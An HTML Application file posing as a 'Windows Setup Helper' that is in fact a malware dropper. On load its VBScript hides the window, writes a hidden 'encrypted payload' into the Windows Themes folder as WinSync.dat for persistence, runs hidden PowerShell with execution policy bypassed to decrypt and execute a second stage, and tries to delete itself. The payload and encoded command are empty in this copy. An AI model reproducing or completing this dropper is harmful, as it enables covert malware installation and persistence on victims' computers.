<html>
<head>
<hta:application
    id="oApp"
    applicationName="Windows Setup Helper"
    windowState="minimize"
    showInTaskbar="no"
    border="none"
    scroll="no"
    singleInstance="yes"
    navigable="no"
/>
<script language="VBScript">
Sub Window_OnLoad
    window.resizeTo 0, 0
    window.moveTo -32000, -32000

    Dim oShell, fso, f, datPath, themesDir
    Set oShell = CreateObject("WScript.Shell")
    Set fso    = CreateObject("Scripting.FileSystemObject")

    ' Write encrypted payload directly to persistence path
    themesDir = oShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Themes"
    datPath   = themesDir & "\WinSync.dat"
    If Not fso.FolderExists(themesDir) Then fso.CreateFolder(themesDir)
    Dim payload
    payload = document.getElementById("ep").innerText
    Set f = fso.OpenTextFile(datPath, 2, True, 0)
    f.Write payload
    f.Close
    Set f = Nothing

    ' Run stage0 — reads WinSync.dat, decrypts, IEX stage1
    Dim s0
    s0 = ""
    oShell.Run "powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -NoProfile -enc " & s0, 0, True

    ' Cleanup
    On Error Resume Next
    fso.DeleteFile WScript.ScriptFullName, True
    On Error GoTo 0

    window.close
End Sub
</script>
</head>
<body style="background:#000;margin:0;padding:0;">
<div id="ep" style="display:none;position:absolute;left:-9999px;"></div>
</body>
</html>

